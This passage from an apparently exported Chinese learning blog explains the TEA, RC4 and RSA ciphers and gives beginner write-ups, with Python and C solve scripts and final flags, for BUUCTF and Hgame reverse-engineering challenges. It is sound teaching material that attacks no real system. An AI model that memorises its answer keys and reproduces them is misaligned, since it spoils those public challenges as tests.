v1 += ((v0&lt;&lt;4) + k2) ^ (v0 + sum) ^ ((v0&gt;&gt;5) + k3); &#125; /* end cycle */ v[0]=v0; v[1]=v1;&#125;int main() &#123; uint32_t v[2]=&#123;1,2&#125;,k[4]=&#123;2,2,3,4&#125;; // v为要加密的数据是两个32位无符号整数 // k为加密解密密钥，为4个32位无符号整数，即密钥长度为128位 printf(&quot;加密前原始数据：%u %u &quot;,v[0],v[1]); encrypt(v, k); printf(&quot;加密后的数据：%u %u &quot;,v[0],v[1]); return 0;&#125; 我们可以看到，v 就是要加密的数据，是两个 32 位无符号整数，而 k 是加密解密的密钥，为 4 个 32 位无符号整数，即密钥长度为 128 位，这个 delta 是为了保证每一轮加密都不同，一般都是 0x9e3779b9，但有的也不一定是这个，这个要根据情况而定 加密过程其实很好理解，就不多解释了，这个是 TEA 算法家族中最简单的，因为还有很多魔改 TEA 也就是 XTEA、XXTEA，我哭 # 解密过程 12345678910111213void decrypt(uint32_t* v, uint32_t* k)&#123; uint32_t v0=v[0], v1=v[1], sum=0xC6EF3720, i; /* set up */ uint32_t delta=0x9e3779b9; /* a key schedule constant */ uint32_t k0=k[0], k1=k[1], k2=k[2], k3=k[3]; /* cache key */ for (i=0; i&lt;32; i++)\t&#123; /* basic cycle start */ v1 -= ((v0&lt;&lt;4) + k2) ^ (v0 + sum) ^ ((v0&gt;&gt;5) + k3); v0 -= ((v1&lt;&lt;4) + k0) ^ (v1 + sum) ^ ((v1&gt;&gt;5) + k1); sum -= delta; &#125; /* end cycle */ v[0]=v0; v[1]=v1;&#125; （未完持续）","tags":["算法"],"categories":["笔记"]},{"title":"RC4算法","path":"/2022/03/31/RC4算法/","content":"# RC4 算法的基本原理： RC4 属于对称密码算法中的流密码加密算法，它的密钥长度是可变的，它以一个足够大的表 S 为基础，对表进行非线性变换，产生密钥流 对称密码：加密和解密使用的是同一个密钥，即明文和密钥异或生成密文 流密码：逐字节，一个字节一个字节进行加密，和它对应的是块加密（分组加密），比较有代表性的就是 DES 加密算法（我还没学） 既然是逐字节进行加密，那么它的重点就是密钥了，RC4 算法是一个密钥长度可变的加密算法，也就是说它的密钥可以是任意长度，而这个密钥流就是以一个足够大的 S 表为基础，并对其进行非线性变换产生的 # 加密过程 # 初始化 S 表 对 S 表进行线性填充，一般为 256 个字节 用种子密钥填充另一个 256 字节的 K 表 用 K 表对 S 表进行初始置换 # 密钥流的生成 为每个待加密的字节生成一个伪随机数，用来进行异或运算（表 S 一旦生成，种子密钥就不再被使用） # 初始化 S 表： 第一步，我们首先对 S 表进行一个升序填充，从 0 到 255，也就是 S [0]=0，S [1]=1，S [2]=2，直到 S [255]=255；第二步要用到密钥，也就是种子密钥，用种子密钥来填充另一个 256 字节的 K 表，这个密钥的长度一般不会很长，比如我们现在密钥是 3，4，5，那么我们就用 3，4，5 来循环填充这个 K 表一直到 K [255]；第三步用 K 表对 S 表进行初始置换，也就是从 S [0] 开始到 S [255]，对每个 S [i] 根据 K [i] 确定的一个方案，将 S [i] 置换为 S 中的另一个字节，对于这个初始置换，我们举一个例子 S 表： 0 1 2 3 4 5 6 S[0] S[1] S[2] S[3] S[4] S[5] S[6] K 表： 3 4 5 3 4 5 3 K[0] K[1] K[2] K[3] K[4] K[5] K[6] 置换： 1234j=0;for i=0 to 255 do\tj=(j+S[i]+K[i]) mod 256; //实际上只要除以7就可以了，因为我们举的例子是7位的表\tSwap(S[i], S[j]); 我们取 i，j 都为 0，从 0 到 255 开始查值，然后通过第三行 j 的计算得到一个下标，那么我们就把当前操作位的值和这一位的值进行一个置换，比如第 0 位的计算过程是这样的： 1j=(0+S[0]+K[0]) mod 7 = 3 mod 7 = 3 所以我们将第 0 位的值和第三位的值进行一个交换，那么从 0 到 6 每个值都进行变换之后我们就得到了一个新的 S 表： 3 0 1 4 5 2 6 S[0] S[1] S[2] S[3] S[4] S[5] S[6] # 密钥流的生成： 因为是流密码，所以我们要为每一个待加密的字节生成一个用来与之进行异或运算的伪随机值，这个数值也是从 S 表中获取，所以我们要做的就是找到这个随机数的下标，也就是这个随机数是 S 几，下面是生成密钥流的操作： 1234567i,j=0;for r=0 to len do //r为明文长度，r字节\ti=(i+1) mod 256;\tj=(j+S[i]) mod 256;\tswap(S[i], S[j]);\tt=(S[i]+S[j]) mod 256;\tK[r]=S[t]; 这个 K 就是伪随机数值所组成的一个数组，t 是 S 的下标，我们就是要找到这个下标也就是这个 t，那么这个 t 又是通过 S [i] 和 S [j] 来进行计算，然后 i 和 j 又是通过第 3、4 行来计算，即： 123i=(i+1) mod 7 = 0+1 mod 7 = 1；j=(j+S[i]) mod 7 = 0+S[1] mod 7 = 0+0 mod 7 = 0；swap(S[0], S[1]); 需要注意的是，在每次算完 i 和 j 之后都会有两个值的交换，也就是说每一轮之后这个 S 表都是变了的，都是不一样的，然后计算 t 后将对应下标的值传给 K 表： 123t = S[0]+S[1] mod 7 = 3;S[3] = 4;K[0] = S[3] = 4; 那么和 S [0] 进行异或运算的伪随机数就是这个 K [0]，以此类推，最终得到密文 # 总结： 以一个 256 字节的 S 表为基础，使用密钥填充一个 K 表，再用这个 K 表对 S 表进行初始置换，密钥不同生成的 S 表也不同，然后我们要取明文的长度，明文多长，密钥流就多长，通过运算生成密钥流，这个运算过程就是一个找下标 t 的过程，而每一次的随机数的生成都会对 S 表（此时的 S 表是明文长度的 S 表）进行两个数字的置换，所以每一轮的 S 表都是不同的，最后我们拿这个密钥流也就是 K 表，与明文一一对应地进行异或运算，得出密文，这就是总体的过程 实战可以看这篇博客：DASCTF×SU2022-easyre | ChengHan’s Blog (tchdv.cn) 参考视频 ——RC4 加密算法 | 流密码 | 对称密码 | 密码学 | 信息安全_哔哩哔哩_bilibili","tags":["算法"],"categories":["笔记"]},{"title":"RSA算法","path":"/2022/03/25/RSA算法/","content":"# RSA 加密 密文=明文EmodN密文 = 明文^E mod N 密文=明文EmodN E 为 encryption (加密) 的缩写 # RSA 解密 明文=密文DmodN明文 = 密文^D mod N 明文=密文DmodN D 为 decryption (解密) 的缩写 # 生成密钥对 密钥对为（E, D, N） 要生成密钥对，还要分别求出 N, L, E, D # 求 N N=p×qN = p × q N=p×q 其中 p 和 q 是两个质数（素数），这两个质数不能太小，否则容易被破解 质数又称素数，一个大于 1 的自然数，除了 1 和它自身外，不能被其他自然数整除的数叫做质数 # 求 L L=(p−1)×(q−1)L = (p-1) × (q-1) L=(p−1)×(q−1) L=lcm(p−1,q−1)L = lcm(p-1, q-1) L=lcm(p−1,q−1) 其中 L 是 p-1 和 q-1 的最小公倍数，lcm 就是最小公倍数的意思 L 是一个中间变量，我们需要求出 L 以求出 E # 求 E 1&lt;E&lt;L1&lt;E&lt;L 1&lt;E&lt;L gcd(E,L)=1gcd(E, L) = 1 gcd(E,L)=1 E 是一个比 1 大但是比 L 即 lcm 小的数，gcd 就是最大公约数的意思 # 求 D 1&lt;D&lt;L1&lt;D&lt;L 1&lt;D&lt;L E×DmodL=1E × D mod L = 1 E×DmodL=1 # 实战： 了解了原理之后我们来实战一下 这有一道题 很明显，其中 E 指数 = 65537，N = 103461035900816914121390101299049044413950405173712170434161686539878160984549 而 ad939ff59f6e70bcbfad406f2494993757eee98b91bc244184a377520d06fc35 则是 16 进制密文 我们可以通过分解 N 来求 p 和 q，可以用 http://www.factordb.com/ 这个网站来分解，分解得到 12p = 282164587459512124844245113950593348271q = 366669102002966856876605669837014229419 这样我们就可以通过 p-1 和 q-1 来求 L ，但 L 只是一个中间变量，我们现在可以不求出来，最后用脚本代入即可，求出 L 之后就可以求出 D，求出 D 之后就可以解出来了 明文=密文DmodN明文 = 密文^D mod N 明文=密文DmodN # 脚本如下 1234567891011121314import gmpy2import binasciip = 282164587459512124844245113950593348271q = 366669102002966856876605669837014229419E = 65537miwen = 0xad939ff59f6e70bcbfad406f2494993757eee98b91bc244184a377520d06fc35N = p * qD = gmpy2.invert(E, (p-1) * (q-1))mingwen = gmpy2.powmod(miwen, D, N)print(binascii.unhexlify(hex(mingwen)[2:]).decode(encoding=&quot;utf-8&quot;)) 解出 flag 为：suctf{Pwn_@_hundred_years} 题目来源：BUUCTF 在线评测 (buuoj.cn) 参考博客：(25 条消息) 带你彻底理解 RSA 算法原理_小宝一号的博客 - CSDN 博客_rsa 是哪个国家","tags":["算法"],"categories":["笔记"]},{"title":"easyasm","path":"/2022/03/15/easyasm/","content":"# 汇编语言 这个题是寒假的时候一个叫 Hgame 的比赛的题，当时也做了一下没看懂，开学之后学了点汇编之后就勉强能看懂了，勉强弄懂了它的逻辑，先看看它的汇编语言吧： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121seg001:0000 seg001 segment byte public &#x27;UNK&#x27; use16seg001:0000 assume cs:seg001seg001:0000 assume es:nothing, ss:nothing, ds:dseg, fs:nothing, gs:nothingseg001:0000 db 91hseg001:0001 db 61h ; aseg001:0002 db 1seg001:0003 db 0C1hseg001:0004 db 41h ; Aseg001:0005 db 0A0hseg001:0006 db 60h ; `seg001:0007 db 41h ; Aseg001:0008 db 0D1hseg001:0009 db 21h ; !seg001:000A db 14hseg001:000B db 0C1hseg001:000C db 41h ; Aseg001:000D db 0E2hseg001:000E db 50h ; Pseg001:000F db 0E1hseg001:0010 db 0E2hseg001:0011 db 54h ; Tseg001:0012 db 20hseg001:0013 db 0C1hseg001:0014 db 0E2hseg001:0015 db 60h ; `seg001:0016 db 14hseg001:0017 db 30h ; 0seg001:0018 db 0D1hseg001:0019 db 51h ; Qseg001:001A db 0C0hseg001:001B db 17hseg001:001C db 0seg001:001D db 0seg001:001E db 0seg001:001F db 0seg001:001F seg001 endsseg001:001Fseg002:0000 ; ===========================================================================seg002:0000seg002:0000 ; Segment type: Uninitializedseg002:0000 seg002 segment byte stack &#x27;STACK&#x27; use16seg002:0000 assume cs:seg002seg002:0000 assume es:nothing, ss:nothing, ds:dseg, fs:nothing, gs:nothingseg002:0000 db 80h dup(0)seg002:0000 seg002 endsseg002:0000seg003:0000 ; ===========================================================================seg003:0000seg003:0000 ; Segment type: Pure codeseg003:0000 seg003 segment byte public &#x27;CODE&#x27; use16seg003:0000 assume cs:seg003seg003:0000 assume es:nothing, ss:seg002, ds:nothing, fs:nothing, gs:nothingseg003:0000seg003:0000 ; =============== S U B R O U T I N E =======================================seg003:0000seg003:0000 ; Attributes: noreturnseg003:0000seg003:0000 public startseg003:0000 start proc nearseg003:0000 mov ax, seg dsegseg003:0003 mov ds, axseg003:0005 assume ds:dsegseg003:0005 mov ax, seg seg001seg003:0008 mov es, axseg003:000A assume es:seg001seg003:000A mov si, 0seg003:000Dseg003:000D loc_100DD: ; CODE XREF: start+38↓jseg003:000D cmp si, 1Chseg003:0010 jz short loc_10135seg003:0012 xor ax, axseg003:0014 mov al, [si]seg003:0016 shl al, 1seg003:0018 shl al, 1seg003:001A shl al, 1seg003:001C shl al, 1seg003:001E push axseg003:001F xor ax, axseg003:0021 mov al, [si]seg003:0023 shr al, 1seg003:0025 shr al, 1seg003:0027 shr al, 1seg003:0029 shr al, 1seg003:002B pop bxseg003:002C add ax, bxseg003:002E xor ax, 17hseg003:0031 add si, 1seg003:0034 cmp al, es:[si-1]seg003:0038 jz short loc_100DDseg003:003A mov ax, 0B800hseg003:003D mov es, axseg003:003F assume es:nothingseg003:003F mov byte ptr es:0, 77h ; &#x27;w&#x27;seg003:0045 mov byte ptr es:2, 72h ; &#x27;r&#x27;seg003:004B mov byte ptr es:4, 6Fh ; &#x27;o&#x27;seg003:0051 mov byte ptr es:6, 6Eh ; &#x27;n&#x27;seg003:0057 mov byte ptr es:8, 67h ; &#x27;g&#x27;seg003:005D mov byte ptr es:0Ah, 21h ; &#x27;!&#x27;seg003:0063seg003:0063 loc_10133: ; CODE XREF: start:loc_10133↓jseg003:0063 jmp short loc_10133seg003:0065 ; ---------------------------------------------------------------------------seg003:0065seg003:0065 loc_10135: ; CODE XREF: start+10↑jseg003:0065 mov ax, 0B800hseg003:0068 mov es, axseg003:006A mov byte ptr es:0, 72h ; &#x27;r&#x27;seg003:0070 mov byte ptr es:2, 69h ; &#x27;i&#x27;seg003:0076 mov byte ptr es:4, 67h ; &#x27;g&#x27;seg003:007C mov byte ptr es:6, 68h ; &#x27;h&#x27;seg003:0082 mov byte ptr es:8, 74h ; &#x27;t&#x27;seg003:0088 mov byte ptr es:0Ah, 21h ; &#x27;!&#x27;seg003:008Eseg003:008E loc_1015E: ; CODE XREF: start:loc_1015E↓jseg003:008E jmp short loc_1015Eseg003:008E start endpseg003:008Eseg003:008E seg003 endsseg003:008Eseg003:008Eseg003:008E end start # 思路 它的逻辑是将输入的字符左移四位再右移四位再相加，然后再将每一位与 0x17 异或运算，如果每一位结果都等于 seg001 中的值对应相等就输出 right，那么我们就逆着来写个脚本 # 脚本 # 问题 一开始我是用 python 写的，但是一直输出不了正确答案，我很疑惑，然后看了大佬写的脚本之后发现他们在第八行，在左移的时候给 xor 还与上了一个 0x0f（还有大佬与上的是 0xff），这样之后结果就是对的，这里我还是没搞懂 123456789list = [0x91, 0x61, 0x1, 0xc1, 0x41, 0xa0, 0x60, 0x41, 0xd1, 0x21, 0x14, 0xc1, 0x41, 0xe2 0x50, 0xe1, 0xe2, 0x54, 0x20, 0xc1, 0xe2, 0x60, 0x14, 0x30, 0xd1, 0x51, 0xc0, 0x17]flag = &#x27;&#x27;for i in list: xor = i ^ 0x17 flag += chr((xor &gt;&gt; 4) + ((xor &amp; 0x0f) &lt;&lt; 4))print(flag) 然后我同学就告诉我用 c 语言来写脚本，发现 c 语言可以不用这样 12345678910111213141516#include&lt;stdio.h&gt;int main()&#123;\tint a[28] = &#123;0x91,0x61,0x1,0xc1,0x41,0xa0,0x60,0x41,0xd1,0x21,0x14,0xc1,0x41,0xe2,0x50,0xe1,0xe2,0x54,0x20,0xc1,0xe2,0x60,0x14,0x30,0xd1,0x51,0xc0,0x17&#125;;\tfor(int i=0;i&lt;28;i++)\t&#123; a[i] = a[i] ^ 23;\t&#125;\tfor(int i=0;i&lt;28;i++)\t&#123; a[i] = (a[i]&gt;&gt;4)+ (a[i]&lt;&lt;4); printf(&quot;%c&quot;,a[i]); &#125;\treturn 0;&#125; 这里要注意一个细节，就是在程序中，我们的值是先进行左移再进行右移的，所以我们在写脚本的时候要注意，要先右移再左移，这样的结果才是对的，一开始我没注意，我同学告诉我之后我才知道这个细节，学到了 最后得到 flag：hgame{welc0me_to_4sm_w0rld} 题目来源：Hgame ctf 2022 – easyasm","tags":["reverse"],"categories":["wp"]},{"title":"Xor","path":"/2022/03/14/Xor/","content":"查壳后发现无壳且是 32 位程序，所以我们直接用 32 位 IDA PRO 打开即可，还是一样找主函数，但是当我 F5 反汇编的之后却发现无法反汇编 在这里我卡住了，于是我上网查了一下别的大佬写的 wp 我们跟踪一下这个地址，跳到 00401095 这个地址之后，我们再按 F5 反汇编，然后再重新进入 main 函数，就可以反汇编了 这下思路就很清晰了，逻辑很简单，就直接上脚本吧 123456a = &#x27;MSAWB~FXZ:J:`tQJ&quot;N@ bpdd&#125;8g&#x27;b = &#x27;&#x27;for i in range(len(a)): b += chr (i ^ ord(a[i]))print(b) 得到 flag：MRCTF{@_R3@1ly_E2_R3verse!} 题目来源：BUUCTF 在线评测 (buuoj.cn)–Xor","tags":["reverse"],"categories":["wp"]},{"title":"CrackRTF","path":"/2022/03/12/CrackRTF/","content":"首先我想说，这道题对于我这个小白来说简直是难出天际，还是看了好多大佬的 wp 才能勉强做出来，中间仍然有一些没理解的地方 首先照例拿到 exeinfope 中查看，是 32 位程序，拿到 IDA PRO 中查找主函数，主函数如下： 真的好长，我看了好久吧久才看懂它的大概思路 # 第一部分 看这一部分，我们可以知道，它这个密码是 6 位数，而且大于 100000 关键来了，这个六位数我们要把它和 @DBApp 拼接，然后放到 sub_40100A 这个函数中进行计算，计算得出的结果要等于 6E32D0943418C2C33385BC35A1470250DD8923A9 # 引申知识点 atoi 函数的作用是将字符串转化为整型 strcmpi 函数是将两个字符串进行对比，并且忽略大小写的影响，例如 Yes 和 YES 的输出结果仍为 1，但在这里的 strcmpi 函数前有一个！，输出结果应该是 0，按理来说不会运行下面的代码，这里有点没搞明白 我们点开 sub_40100A 函数： 看见了很多新的东西，我就是从这里开始崩溃的… 但是不能慌，我们可以上网查，但是上网查了之后也没怎么懂，看了大佬的 wp 之后才理解，这是一个哈希加密，然后一般的范围是小于 999999（这里我没太明白，我也没理解这个范围是怎么求的） # 脚本 1 所以我们可以在这个范围里面进行爆破解密，脚本如下： 12345678910import hashlibstr1 = &#x27;@DBApp&#x27;for i in range(100000, 999999): psw = str(i)+str1 x = hashlib.sha1(psw.encode(&quot;utf8&quot;)) y = x.hexdigest() if &quot;6e32d0943418c2c33385bc35a1470250dd8923a9&quot; == y: print(psw) break # 补充 encode 是编码，后面的括号内是其编码的格式，这里就是将得到的 psw 编码为 utf8 格式 x.hexdigest () 是将 y 转换成 16 进制格式进而与 6e32d0943418c2c33385bc35a1470250dd8923a9 进行计算，如果去掉 hex 就是十进制 爆破后得到 123321@DBApp，密码就是前六位也就是 123321（说实话做到这我人已经懵了，光是我自己我基本做不出来，虽然脚本是自己写的，但思路都是参照大佬的 wp 来的） # 第二部分 第一个密码终于解出来了，现在要解第二个密码 其实这个 sub_401019 函数和第一个差不多，但是我们没有范围，所以不能爆破，只能跳过了 但是不要灰心，“亲爱的” 出题人在后面又给了我们两个函数噢！ 我们点开 sub_40100F 这个函数进去，会发现又有一大堆新的东西！！完全看不懂是什么 在百度查了一下 FindResourceA 这个函数，我看不太懂，我就直接移植大佬的解释吧 呃，其实还是不太理解哈哈哈哈 现在我们看到 sub_401005 这个函数 上面 FindResourceA 函数传递的值会传到这里，进行抑或运算，在这里我们需要用到一个叫做 Resourse Hacker 的软件来查看 框出来的数字就是我们要进行抑或运算的六位数字的一部分 # 脚本 2 因为最后会生成一个.rtf 文件，而.rtf 文件的标识符前六位是 {\\rtf1，所以我们就把 0x05,0x7D,0x41,0x15,0x26,0x01 和 {\\rtf1 进行抑或运算，写一个脚本进行计算 123456789a = [0x05, 0x7D, 0x41, 0x15, 0x26, 0x01]b = &#x27;&#x27;c = &#x27;&#123;\\\\rtf1&#x27;for i in range(0, len(a)): b += chr(ord(c[i]) ^ a[i])print(b) 得到第二个密码为～！3a@0 最后运行程序，输入两次密码，会生成一个.rtf 文件在根目录 点开即得到 Flag {N0_M0re_Free_Bugs} 题目来源：BUUCTF 在线评测 (buuoj.cn)–CrackRTF","tags":["reverse"],"categories":["wp"]},{"title":"JustRE","path":"/2022/03/12/JustRE/","content":"还是照例用 exeinfope 打开，发现是 32 位程序，那么我们直接用 32 位 IDA PRO 打开即可，ctrl+f 查找 main 函数 F5 看伪代码发现没啥东西，于是 shift+F12 查看字符串，拉到最底下的时候发现一个 flag（熟悉的配方） ctrl+x 跟进以下查看函数 我们注意以下这一行 一开始我还懵了半天，后面过了一会再看，咦，这不就是 c 语言的 printf 函数吗哈哈哈哈，所以只要把 19999 和 0 代替两个 % d 就可以了，over flag：BJD 题目来源：BUUCTF 在线评测 (buuoj.cn)–JustRE","tags":["reverse"],"categories":["wp"]},{"title":"pyre","path":"/2022/03/12/pyre/","content":"# 1. 审计代码 拿到题目后发现这是一个 pyc 文件，是一道 python 逆向题，拿到在线反编译器中反编译一下，可以得到以下代码： 12345678910111213141516171819202122232425262728293031323334print &quot;Welcome to Re World!&quot;print &quot;Your input1 is your flag~&quot;l = len(input1)for i in range(l): num = ((input1[i] + i) % 128 + 128) % 128 code += numfor i in range(l - 1): code[i] = code[i] ^ code[i + 1]print codecode = [ &quot;\\x1f&quot;, &quot;\\x12&quot;, &quot;\\x1d&quot;, &quot;(&quot;, &quot;0&quot;, &quot;4&quot;, &quot;\\x01&quot;, &quot;\\x06&quot;, &quot;\\x14&quot;, &quot;4&quot;, &quot;,&quot;, &quot;\\x1b&quot;, &quot;U&quot;, &quot;?&quot;, &quot;o&quot;, &quot;6&quot;, &quot;*&quot;, &quot;:&quot;, &quot;\\x01&quot;, &quot;D&quot;, &quot;;&quot;, &quot;%&quot;, &quot;\\x13&quot;,] 我们只要逐步反向写脚本就可以得到 flag，不过我在写脚本的时候想了很久，一直都没搞出来 # 2. 确定思路 首先是这一部分： 12for i in range(l - 1): code[i] = code[i] ^ code[i + 1] 这行代码的意思是将 code 从第一位开始，和后一位进行异或运算，一直到倒数第二位，那我们要还原这一步的话我们就要反过来抑或，就是这里我卡了很久，不知道怎么解决，知道看到大佬的 wp，发现可以这样： 12for i in range(l-2, -1, -1): code[i] = chr(ord(code[i]) ^ ord(code[i + 1])) # 3. 写出脚本 后面那步还比较好理解，把式子化简以下就可以，最后完整的脚本如下： 1234567891011code = [&#x27;\\x1f&#x27;, &#x27;\\x12&#x27;, &#x27;\\x1d&#x27;, &#x27;(&#x27;, &#x27;0&#x27;, &#x27;4&#x27;, &#x27;\\x01&#x27;, &#x27;\\x06&#x27;, &#x27;\\x14&#x27;, &#x27;4&#x27;, &#x27;,&#x27;, &#x27;\\x1b&#x27;,&#x27;U&#x27;, &#x27;?&#x27;, &#x27;o&#x27;, &#x27;6&#x27;, &#x27;*&#x27;, &#x27;:&#x27;, &#x27;\\x01&#x27;, &#x27;D&#x27;, &#x27;;&#x27;, &#x27;%&#x27;, &#x27;\\x13&#x27;]flag = &#x27;&#x27;l = len(code)for i in range(l-2, -1, -1): code[i] = chr(ord(code[i]) ^ ord(code[i + 1]))for i in range(0, len(code)): flag += chr((ord(code[i]) - i) % 128)print(flag) flag：GWHT 题目来源：BUUCTF 在线评测 (buuoj.cn)–pyre","tags":["reverse"],"categories":["wp"]},{"title":"luckguy","path":"/2022/03/11/luckguy/","content":"首先用 exeinfope 查壳，但没什么结果，所以我尝试先直接用 64 位 ida pro 打开，然后直接找到主函数 还是没什么发现，于是就 shift+F12 看查看字符串，看到一个疑似 flag 的字符串 双击点进去，ctrl+x 跟进一下，F5 查看函数 在 case1 中看到 flag 是 s 和 f1、f2 拼接，可以知道 flag 的前一部分是 GXY {do_not_ 往后看，在 case4 中又发现得到的前部分还要和 s 拼接，所以剩下的就只要求出后一部分 flag 就可以了 不难看出，在 case5 中要将 s 进行一系列计算，s 正好可以分为一个八位的 16 进制数，只要将这 8 位 16 进制数进行以下计算就行了，用 python 写个脚本即可得出（要注意要将得到的字符串反向） 得到后一部分 flag 拼接得到最终的 flag： GXY 题目来源：BUUCTF 在线评测 (buuoj.cn)–luck_guy","tags":["reverse"],"categories":["wp"]},{"title":"友情链接","path":"/friends/index.html","content":"AjiemikeyWchTuytkgortermRwJunshangwendada"},{"title":"关于","path":"/about/index.html","content":"欢迎来到阿翰的博客，此博客用来发布平时刷题写的题解或者是一些学到的新知识，本人是个刚入门不久的新手，内容干货可能不那么多哈哈哈，如果博客中有错误或者建议修改的地方，欢迎大家加我 QQ 进行指正：2217018023，希望所有人都一起加油一起变强！"}]